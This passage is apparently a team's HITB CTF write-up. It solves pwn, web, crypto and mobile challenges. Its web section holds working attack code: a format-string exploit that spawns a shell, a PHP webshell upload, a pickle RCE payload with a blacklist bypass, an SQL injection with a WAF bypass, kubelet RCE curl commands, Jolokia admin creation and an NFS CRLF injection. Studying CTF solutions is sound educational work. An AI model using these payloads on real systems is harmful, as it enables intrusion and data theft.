r.sendline(payload)
gets = u64(r.recv(1000, timeout=1)[:6].ljust(8, '\x00'))
print 'gets:', hex(gets)

libc = gets - gets_off
print 'libc:', hex(libc)

system = libc + system_off
print 'system:', hex(system)

payload = ''
prev = 0
for i in range(3):
    payload += fmt(prev, (system >> 8 * i) & 0xff, 11 + i)
    prev = (system >> 8 * i) & 0xff

payload += 'A'*(8 - (len(payload) % 8))
payload += p64(printf_plt) + p64(printf_plt+1) + p64(printf_plt+2)

r.sendline(payload)

r.recv(1000)
sleep(1)

r.sendline('/bin/sh')
r.sendline('cat flag')
flag = r.recvline()

log.success('FLAG: ' + flag)
```
```
[+] Opening connection to 47.75.182.113 on port 9999: Done
gets: 0x7f99aca0dd80
libc: 0x7f99ac99f000
system: 0x7f99ac9e4390
[+] FLAG: HITB{Baby_Pwn_BabY_bl1nd}
[*] Closed connection to 47.75.182.113 port 9999
```

## web

### Upload (bookgin)

#### Find the target
First, we can upload some images to the server. With some manual tests, we found we can upload `.PHP` to the server, since `.php` is WAFed. Addiotionally, we notice that the server OS is running Microsoft IIS, so the filesystem is case-insensitive. 

Next, we have to dig how to access our webshell. We have no idea the directory name of the uploaded files. 

Therefore, the objective is very clear: retrieve the path name of the directory.

It's Windows+PHP, so let's give this a try. Refer to [onsec whiltepaper - 02](http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf) page 5. I even write a post about this feature in [my blog](https://bookgin.github.io/2016/09/07/PHP-File-Access-in-Windows/) (in Chinese).

#### Brute force the path and RCE
Here is the brute script:

```python
#!/usr/bin/env python3
# Python 3.6.4
import requests
import string
sess = requests.session()

name = ''
while True:
    print(name)
    for i in string.digits + string.ascii_letters:
        guess = name + str(i)
        if 'image error' not in sess.get('http://47.90.97.18:9999/pic.php?filename=../' + guess + '%3C/1523462240.jpg').text:
            name += str(i)
            break
```

We have RCE now. Next, we found the flag is in `../flag.php`, but some php useful function is disabled. A quick bypass is `highlight_file`. Here is the web shell:
```php
<?php
error_reporting(E_ALL);

foreach (glob("../flag.php") as $filename) {
    echo "$filename size " . filesize($filename) . "\n";
    highlight_file($filename);
}
```

The flag is `HITB{e5f476c1e4c6dc66278db95f0b5a228a}`.

### Python's revenge (sasdf)
Bruteforce 4 bytes cookie secret offline which is `hitb`. Once we have cookie secret, we can construct malicious pickle that trigger RCE in serverside by pickle's `reduce` instruction. It has a large blacklist for filtering functions which are used to reduce, such as `os.system`. But it doesn't reject to import them onto pickle stack. Call `__builtin__.map(os.system, [code])` to bypass blacklist.

#### Payload
Replace `'echo 1337'` with repr of reverse shell payload that can be easily found on Internet. Use echo here for increasing readability.
```python
"c__builtin__\nrepr\np\nc__builtin__\nmap\np\n(cos\nsystem\n(lp0\nS'echo 1337'\np1\natp\nRp\nRp\n."
```

### PHP lover (bookgin & sces60107)

#### Possible SQL injection
In the PHP source files, the report is very suspicious. The only way to create a report is to trigger an error here:

```php
if(file_exists($avatar) and filesize($avatar)<65535){
    $data=file_get_contents($avatar);
    if(!$this->user->updateavatar($data)) quit('Something error!');
} 
else{
    //TODO！report it！
    $out="Your avatar is invalid, so we reported it"."</p>";
    $report=$this->user->getreport();
    if($report){
        $out.="Your last report used email ".htmlspecialchars($report[2],ENT_QUOTES).", and report type is ".$report[3];
    } 
    include("templates/error.html");
    if(!$this->user->report(1)) quit('Something error!');
    die();
} 
```

Also, when insering a new report, it seems vulnerable to SQL injection. Unlike other edting features in the website, the email address here is not properly escaped through `addslashes()`. 

```php
function report($type_id){                                                                                                           
    return $this->db->Insert("reports",array($this->id,"'$this->email'",$type_id));
} 
```

But how to trigger this error in order to create a new report? We have to make the test failed `file_exists($avatar)`. The `$avatar` is the filepath of our avatar, and the fiepath is `upload/[USERNAME].png`. In order to make the file somehow "disappeared", we can make avatar.filepath length limit `varchar(300)` in the SQL schema very long, because in the source code:
```php
$filename="uploads/".$this->user->getuser().".".$type;
if(is_uploaded_file($_FILES['avatar']['tmp_name'])){
    $this->user->edit("avatar",array($filename,$type));
```

Simply register a user with username length 300, and the avatar.filepath will be truncated.

Next, in order to exploit SQL injection, we have to bypass the email format regex check and another filter.

#### Bypass WAFs

##### Email format regex check
```php
if(!preg_match('/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/i',$value)) return false;
```

Taking a closer look, we found it can be bypassed using double quotes. This is a valid email address `"', 17385)#'"@a.aa`.

##### Hacker Filter

```php
$preg="\\b(benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\()|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|\'|\").*?(`|\'|\"))FROM(\\{.+\\}|\\(.+\\)|\\s+?.+?|(`|\'|\").*?(`|\'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
if(preg_match("/".$preg."/is",$string)){
    die('hacker');
} 
```

This regex almost filters all the useful keywords in SQL. However, we note that the first character `b` in the regex, which means [word match](http://php.net/manual/en/function.preg-match.php#105924). Thus, we can just append a MySQL comment `/**/` to bypass the filter!

#### Get the flag

The payload will be like this. In order to creat a valid SQL query, the `#` is required to comment out the trailing `@a.aa` in the email address.
```
"', 12), (10272, (SELECT * FROM/**/ users), 9487)#"@a.aa
```

So the raw SQL query in the server side becomes:
```
insert into reports (`...`, `...`) values 
(9453 , '"', 12), 
(10272, (SQLi PAYLOAD), 9487)#"@a.aa' , 1 )
```

After retriving the table and column name using group_concat and information_schema, we are able to get the flag.

Final payload: `"', 9453), (10272, (SELECT GROUP_CONCAT(fllllag_is_hhhhere) FROM/**/ fffflag_is_here), 9487)#"@a.aa`

The flag is `HITB{2e9ular131mp0rt4nt}`.

Refer to [SQL injection cheatsheet by pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

### baby baby (bookgin)

#### Recon

The NMAP scanning result shows 3 ports are opened:

- 80: HTTP + nginx
- 9999: HTTP + nginx
- 10250: HTTPS + unkownn backend

First, the 80 port webserver is running PHP as backend. For the port 9999, it returns 403 forbidden when accessing the root. How about trying to access `index.php` ? To our surprise we got this:

```php
This is a pentest challenge, open your mind!                                                                                             
<img style="width: 300px;" src="jd.png" alt="the picture is unrelated to this challenge, just a advertisement" />

<?php
    eval($__POST["backdoor"]);
?>
```

Note that ther are 2 underscores. After wasting 2 hours on finding a way to exploit this backdoor, we think this direction is incorrect. It's just a troll.

So how about the 10250 port? We use Dirbuster to brute force the filepath at a very low rate (2 request per second), to not affect other teams. Quickly it finds 2 intersting pages:

- https://47.75.146.42:10250/metrics
- https://47.75.146.42:10250/stats 

After Googling, this is related to kubelet API. Acctually, we can just Google the port number and found it. However we fotgot to do that...... It's really dumb to do directory name brute force.

Another quick Google, we found the kubelet API is vulnerable to RCE. Refer to https://github.com/bgeesaman/hhkbe, page P.35.

#### RCE

- Get the info of running pods: `curl -sk https://47.75.146.42:10250/runningpods/`
- RCE: `curl -sk https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test -d 'cmd=cat /flag.txt'`

The flag is `HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}`. (The acronym of kubernetes is k8s) 

### baby nya (bookgin)

The hint: `the tomcat deployed jolokia.war`

#### Exposed Jserv protocol

2 ports are open:

- 8009: ajp13 Apache Jserv
- 9999: nginx HTTP

The 9999 port will only return `<h1>debug port for admin, you can just ignore the port.</h1>`. We trust him so we didn't dig it deeper.

For the 8089 port, it exposes the Jserv protocol, we can set up a apache as a local proxy server to coonect tot the remote webserver. Refer to https://highon.coffee/blog/sleepy-ctf-walkthrough/#apache-tomcat-jserv-proxy-setup .

A quick dive into the webserver, we found the jolokia API can be used. For the document, refer to https://jolokia.org/reference/html/protocol.html .



#### Exploit the jolokia

Refer to https://paper.seebug.org/552/

- List APIs : `/jolokia/list`
- CreateAdmin Account and login: POST 3 jsons requests, Here is the script. You can use curl to send json request as well.
```
#!/usr/bin/env python3
# Python 3.6.4
import requests
import json
sess = requests.session()

payload = {
        'type':'EXEC',
        "mbean": "Users:database=UserDatabase,type=User,username=\"taiwannoooo1\"",
        #'mbean':'Users:database=UserDatabase,type=UserDatabase',
        'operation':'addRole',
        #'arguments':['manager-gui'],
        'arguments':['taiwannoooo1', 'TAIWAN', 'i_love_taiwan'],
}

response = sess.post('http://MY_SERVER_IP/jolokia', json=payload)

response_json = json.loads(response.text)
response_json = json.dumps(response_json, indent=2, sort_keys=True)
print(response_json)
print(response.status_code)
```
- Login to admin interface: `/manager/`

The flag is displayed in the manager interace. `HITB{TOMCAT_TOMCAT_KAWAII}`

### baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)

**This writeup is from organizer QQ group (not IRC).**

- The parameters: ip, permission, squash, path
- Problem name: baby fs
- HTML title: CFS

With the knowledge above, one should know it's a NFS server. The page seems to update `/etc/exports` per key.

Then, the ip parameter can accpeted ip range `1.2.3.4/24`, and it seems vulnerable to CRLF injection. 

The payload is  `http://47.75.35.123:9999/?action=create&key=8ce29e523ed35f49c7eb38b63c91f269&ip=140.112.0.0%0A/%20*&permission=rw&squash=no_root_squash`.

Then, listing the root directory through `http://47.75.35.123:9999/?action=list&key=8ce29e523ed35f49c7eb38b63c91f269&path=/` shows the flag.

The flag is `HITB{---->}!}<0>cccc}`.


I think this challenge requires some guessing. Until the competition ends, icchy (Tokyo westerns) is the only one who solves this challenge. Additionally, they solve it very quickly after the challenge releases. Congraz to them. They definitely have brorder knowledge!

### 3pigs (unsolved, written by how2hack)
#### Hint
>1) this is web pwn
>2) Go, I put everything there-----github
>3) you can make the size of topchunk very small
>4) https://github.com/thr33pigs/3pigs/tree/master/ctf
>5) fix the flag

#### Web Challenge? WutFace
You can get the source code from the given Github link.
The webserver using Flask(Python) as backend and connect to another server (which is the 3pigs binary).
The vulnerabilities basically not related to web so I think the first hint make sense. >_>
User uses this website to make actions and the webserver will communicate with the binary server and return the given responses to the user.

#### First stage (Misc)
Before checking the binary, I noticed that there is a kind of "flying pig" that needs a special `secret` code to be able to make it online.
```python
@shop.route('/flypig.php', methods=['POST'])
def flypig():
    if not isadmin(session):
        return alert("Not Login!")
    try:
        secret = request.form.get('secret',None)
        secret = secret.decode("base64")[:0xc0]
        useflypig = getb(session).getpigs()[-1].status
        for i in 'UOTp%I()<>S':
            if i in secret:
                return 'Hacker'
        secret = secret.format("")
    except:
        return 'Input Error'
    ret = getb(session).flypig(secret,useflypig) if secret else "No Secret"
    if ret == 'Time Out':
        logout()
        return ret
    else:
        return ret
```
And from the binary, there is a `flypig()` function:
```C
void flypig() {
    puts("secret:");
    read_n_input(s1, 9);
    if ( unk_203090 || strncmp(s1, "UOTp%I<S", 8uLL) )
    {
        puts("Error_4");
    }
    else
    {
        unk_203088 = malloc(0x70uLL);
        unk_203090 = 1;
        puts("Success");
    }
}
```
Obviously, the `secret` code is `UOTp%I<S`.
However, the webserver filtered all these characters, which means you can't use this function at all! (really?)

#### Python Format String Vulnerability
I was wondering why `secret = secret.format("")` is in the code, so I try to Google it and I found http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/ about danger of Python Format String function, pretty interesting...
The idea is, we can use the attribute of python `str` and also the format string feature to create the `secret` code.
```
>>> dir('')
['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

>>> ''.__doc__
"str(object='') -> string\n\nReturn a nice string representation of the object.\nIf the argument is a string, the return value is the same object."

>>> ''.__doc__[77]
'I'
```
Basically all the attribute itself has `__doc__`, so try to find every characters you need from `str` attributes.

```
>>> secret = '{0.__getslice__.__doc__[56]}{0.count.__doc__[128]}{0.__new__.__doc__[0]}{0.count.__doc__[129]}{0.__mod__.__doc__[19]}{0.__class__.__doc__[77]}{0.__le__.__doc__[12]}{0.count.__doc__[0]}'
>>> secret.format('')
'UOTp%I<S'
```

Payload: `{0.__getslice__.__doc__[56]}{0.count.__doc__[128]}{0.__new__.__doc__[0]}{0.count.__doc__[129]}{0.__mod__.__doc__[19]}{0.__class__.__doc__[77]}{0.__le__.__doc__[12]}{0.count.__doc__[0]}`

#### Second stage (Pwn)
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
There are 5 functions:
1. Add a pig (`malloc(0xc8)`, max=3)
2. Free a pig (`free(pig)`, and set pointer to `'\0'`)
3. Get pigs (Print out the info of all pigs)
4. Flypig (A special pig that need a `secret` code, `malloc(0x70)`, can only use once, cannot be freed)
5. Flying (Give "Flypig" 16 bytes data, can only use once)

The structure of a normal pig:
```
+----------------+----------------+ <- current
|                |   size(0xd0)   |
+----------------+----------------+
|    pig_name    |    (unused)    |
+----------------+----------------+
|                                 |
|           data (0xb8)           |
|                                 |
|                +----------------+ <- next 
|                | topchunk_size  |
+----------------+----------------+
```

#### Vulnerability
* one-byte-off
```C
void read_input(char* buf, int num) {
    v3 = read(0, buf, num);
    if ( v3 <= 0 )
    {
        puts("Error_0");
        exit(0);
    }
    if ( buf[v3 - 1] == '\n' )
        buf[v3 - 1] = '\0';
    else
        buf[v3] = '\0';
}
```
From the read_input function, if we read `num` chars, then it will trigger one-byte-off vulnerability. Basically we can use this to overwite `topchunk` size (as the hint said).

* Flying pig (overwrite next chunk first 16 bytes data)
```C
void flypig() {
    ...
    flypig_addr = malloc(0x70);
    ...
}

void flying() {
    ...
    read_input((char *)(flypig_addr + 0x80), 16);
    ...
}
```
Just as the pig's name, this pig can "fly" to next chunk and overwrite first 16 bytes (17 if one-byte-off) of the data. Can use this to overwrite freed `fd` and `bk`.

```
+----------------+----------------+ <- flypig
|                |   size(0x80)   |
+----------------+----------------+
|                                 |
|        unused data (0x70)       |
|                                 |
+----------------+----------------+ <- freed chunk 
|                |      size      |
+----------------+----------------+ <- flying() input
|       fd       |       bk       |
+----------------+----------------+
```

#### Solution...?

* Leak libc address

There are 3 different pigs `Ke Gua`, `Red Boy`, `Small Li`.
The `addpig()` function will use `strncpy(buf, pig_name, pig_name_len)` to copy pig's name to `pig_name`.
Notice that `Small Li` is 8 bytes, so if we add this pig, we can leak the freed chunk `bk` pointer as no null byte will append after calling `strncpy`, then we can calculate libc address.

* Leak heap address

Using the one-byte-off vulnerability, we can overwrite the `top_chunk` size and caused `sysmalloc` to create a new heap.
Then use the same method above to leak heap address.

* ...

I was unable to solve this challenge in time as I couldn't find a way to exploit. So close....

## crypto

### easy\_block (sasdf)
#### Vulnerability
* We have a service to compute mac for any plaintext.
    ```python
    # must be delete!
    elif choice[0] == 'c':
        un = input('your username:>>')
        un = bytes(un, 'ISO-8859-1')
        print(sha256(mac_key + un).digest().hex())
    ```
* Unpad function doesn't check for valid padding that can trim more than 16 bytes.
    ```python
    def unpad(s):
        return s[0:-s[-1]]
    ```
* Leak 17 bytes of decrypted message.
    ```python
    sha256(mac_key + plaintext).digest().hex()[-64:-30]
    ```
* It check last 31.5 bytes of mac instead of whole string
    ```python
    sha256(mac_key + plaintext).digest().hex()[-63:] == hash.hex()[-63:]
    ```

#### Construct payload
Send `admin` as username, and we will get encrypted data of `adminuser`, modify the padding and trim off the suffix `user`. Use second and third blocks to construct a (48 - 5) bytes padding to avoid being affected by initial vector.

#### Construct hash
Use subroutine `c` to compute target hash. The initial vector is shared between payload and hash, we cannot modify the first 5 bytes because it will change our plaintext. Fortunately, padded message of hash is (32 + 16) bytes, and only last 31.5 bytes after unpad will be verified. So we can use ciphertext of `[5 bytes garbage][32 bytes hash]` as our mac, left first 5 bytes of initial vector unchanged. The ciphertext is constructed by xor previous block with desired plaintext and decrypted plaintext.


### easy\_pub (sasdf)
```python
bytes_to_long(b'\x00\xff') == bytes_to_long(b'\xff') == 255
long_to_bytes(bytes_to_long(b'\x00\xff')) == b'\xff'
```
If we register with empty username, it will give us secret `admin_k` when we login. DONE.


### streamgamex (sasdf)
Use first 24 bits of output as state. Run in reverse direction to get lower 24 bits of initial state (i.e. flag). Bruteforce first 17 bits that satisfy sha256 given in hint.
```python
mask = 0b10110110110011010111001101011010101011011
for _ in range(24):
    lastbit = state & 1
    state >>= 1
    i = (state & mask)
    while i!=0:
        lastbit^=(i&1)
        i=i>>1
    state|=(lastbit<<23)
    print('State: %s' % bin(state)[2:].rjust(24, '0'))
state = bin(state)[2:].rjust(24, '0')
```

### base (how2hack)
This challenge let user input one string and output the "encoded" string.
Our goal is to decode the given string, which is the flag: `2SiG5c9KCepoPA3iCyLHPRJ25uuo4AvD2/7yPHj2ReCofS9s47LU39JDRSU=`

From the challenge name, I quickly think of base64 and other similar encoding algorithm. However I can't really tell how it works as it encodes the string totally different as the usual one.

I try to spam some string and see what I can get, and I think Brute Forcing may help.

Note: I try to scan through all the ASCII (256 possibilities), but after some tries I noted that the flag is only contains hex (16 possibilities).

Here is the script how I attempt to brute force:
```python
flag = '2SiG5c9KCepoPA3iCyLHPRJ25uuo4AvD2/7yPHj2ReCofS9s47LU39JDRSU='
possibilities = range(0x30, 0x3a)          # 0-9
possibilities.extend(range(0x61, 0x67))    # a-f
choose = ''
while True:
    print flag
    for i in possibilities:
        r.sendline(choose+chr(i))
        print r.recvline().strip()
    choose = raw_input().strip()
```

Flag: `HITB{5869616f6d6f40466c61707079506967}`

```
>>> '5869616f6d6f40466c61707079506967'.decode('hex')
'Xiaomo@FlappyPig'
```
Hi Xiaomo :)...

## mobile

### kivy simple (sces60107)

First I extract the `classes.dex` and try analyse the code.

Eventually I found that this apk is using python.

The python script is hidden in the `private.mp3`

Though the scripts is compiled, you can use `uncompyle2`.

Now we have the main.py
```python=
from kivy.uix.popup import Popup
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
import binascii
import marshal
import zlib

class LoginScreen(BoxLayout):

    def __init__(self, **kwargs):
        super(LoginScreen, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.add_widget(Label(text='FLAG'))
        self.flag = TextInput(hint_text='FLAG HERE', multiline=False)
        self.add_widget(self.flag)
        self.hello = Button(text='CHECK')
        self.hello.bind(on_press=self.auth)
        self.add_widget(self.hello)

    def check(self):
        if self.flag.text == 'HITB{this_is_not_flag}':
            return True
        return False

    def auth(self, instance):
        if self.check():
            s = 'Congratulations you got the flag'
        else:
            s = 'Wrong answer'
        popup = Popup(title='result', content=Label(text=s), auto_dismiss=True)
        popup.open()


screen = LoginScreen()
b64 = 'eJzF1MtOE2EUB/DzTculUKAUKJSr3OqIV0TBGEOMRqIuatJhowsndTrVA+MlnYEYhZXEhQuXLlz4CC58BBc+ggsfwYWPYDznhHN8BJr5Tv7fby6Z8/VrIzj+eDRu0kirVFoARwCPAGI6HOx4EBI6CHy+LHLH1/O4zfd8onQAsEOHg0MHmQcHDt45vmc3B50FyHIQELU8qLZyYutmebIusftm3WQ9Yo/NeskKYh2zPrJ+sfdmRbIBsc9mg2RDYl/NSmTDYt/NymQjYj/NRsnGxH6bVcjGxf6aTZBVxcpObdL6rZlNkU2LXTebsT7qZrP2fk/M5shOie2bzdvzPpgtkC2KfTFbIlsW+2ZWIzst9sPMJzsj9stsheys2B+zc2TnxTxP7YL1UTG7aLZidolsVWzT7LL11jBbI7si1ja7SrYu9sZsw+yjWJaHgHZx4F+j/VnHOao4TCXjvbuBQxqXsV9jgDmNt7CiMURP4zZOaXyA3RrncVTjEpY0djCv8S2Oa3yF/OtC0PldLPN8hkuf4ioO8nxA5zWc1LiITuM97NG4hbMaD3FE4z4W+TEFLhOKD7GL59M6r+OYxjXsperz+YzfvZ00n0rI4tdZxkuTxC8yPr3VTNJYTm139mL5S5BZGidteVTqc4dSMil8V/Qsjnb52vSIzRVdGfKu5E5seHWfu2rw3sj460yjTkwt8oqFYZQ00zQM/3cipSErzQt14/nL1l4Sb0pHXAp3/gENPMQt'
eval(marshal.loads(zlib.decompress(binascii.a2b_base64(b64))))

class MyApp(App):

    def build(self):
        return screen


app = MyApp()
app.run()

```

There is a second stage. But it is not difficult to understand.

The following is the script to extract flag

```python=
import zlib
import marshal
import dis
b64 = 'eJzF1MtOE2EUB/DzTculUKAUKJSr3OqIV0TBGEOMRqIuatJhowsndTrVA+MlnYEYhZXEhQuXLlz4CC58BBc+ggsfwYWPYDznhHN8BJr5Tv7fby6Z8/VrIzj+eDRu0kirVFoARwCPAGI6HOx4EBI6CHy+LHLH1/O4zfd8onQAsEOHg0MHmQcHDt45vmc3B50FyHIQELU8qLZyYutmebIusftm3WQ9Yo/NeskKYh2zPrJ+sfdmRbIBsc9mg2RDYl/NSmTDYt/NymQjYj/NRsnGxH6bVcjGxf6aTZBVxcpObdL6rZlNkU2LXTebsT7qZrP2fk/M5shOie2bzdvzPpgtkC2KfTFbIlsW+2ZWIzst9sPMJzsj9stsheys2B+zc2TnxTxP7YL1UTG7aLZidolsVWzT7LL11jBbI7si1ja7SrYu9sZsw+yjWJaHgHZx4F+j/VnHOao4TCXjvbuBQxqXsV9jgDmNt7CiMURP4zZOaXyA3RrncVTjEpY0djCv8S2Oa3yF/OtC0PldLPN8hkuf4ioO8nxA5zWc1LiITuM97NG4hbMaD3FE4z4W+TEFLhOKD7GL59M6r+OYxjXsperz+YzfvZ00n0rI4tdZxkuTxC8yPr3VTNJYTm139mL5S5BZGidteVTqc4dSMil8V/Qsjnb52vSIzRVdGfKu5E5seHWfu2rw3sj460yjTkwt8oqFYZQ00zQM/3cipSErzQt14/nL1l4Sb0pHXAp3/gENPMQt'
a=marshal.loads(zlib.decompress((b64).decode("base64")))

flag=["?"]*50                     # initialize flag string
n=a.co_consts[0].co_consts        # the const contains flag byte and index byte
code=a.co_consts[0].co_code[34:]  # extract useful bytecode

# Now we can reconstruct the flag
while code.find("|\x01\x00d")!=-1:
  pos=code.find("|\x01\x00d")
  code=code[pos:]
  i=ord(code[4])
  j=ord(code[8])
  #the first is index, the second is flag
  flag[n[i]]=n[j]
  code=code[1:]
print "".join(flag)

```
The flag is `HITB{1!F3_1S_&H%r7_v$3_pY7#ON!}`
### multicheck (sasdf)
Extract `claz.dex` from `lib/libcheck.so` by xor with increasing byte stream started with 233 (i.e. i=233; i++). Run the inverse of algorithm in `claz.dex` to uncover input string.
```python
def decBlock(a, b):
    i5 = np.int32(0)
    for _ in range(32):
        i5 -= np.int32(1640531527)
    for _ in range(32):
        b -= (((a << np.int32(4)) + coeff[2]) ^ (a + i5)) ^ ((a >> np.int32(5)) + coeff[3])
        a -= (((b << np.int32(4)) + coeff[0]) ^ (b + i5)) ^ ((b >> np.int32(5)) + coeff[1])
        i5 += np.int32(1640531527)
    return int(a), int(b)
```